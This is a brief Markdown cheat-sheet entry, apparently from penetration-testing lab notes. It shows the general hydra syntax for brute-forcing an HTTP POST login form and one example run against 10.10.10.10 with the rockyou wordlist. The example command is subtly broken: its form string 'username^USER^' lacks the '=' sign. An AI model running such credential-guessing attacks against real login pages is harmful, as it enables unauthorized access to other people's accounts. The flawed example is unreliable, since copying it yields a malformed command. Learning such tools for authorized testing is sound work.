+++
title = "Http Post Form"
+++

General syntax:

```bash
$ hydra -l <username> -P <wordlist> <Target IP> http-post-form "<URL Path>:<Post Arg>=^<KEY>^:<TAGS>"
```

Example:

- `hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login:username^USER^&password=^PASS^:F=incorrect"`
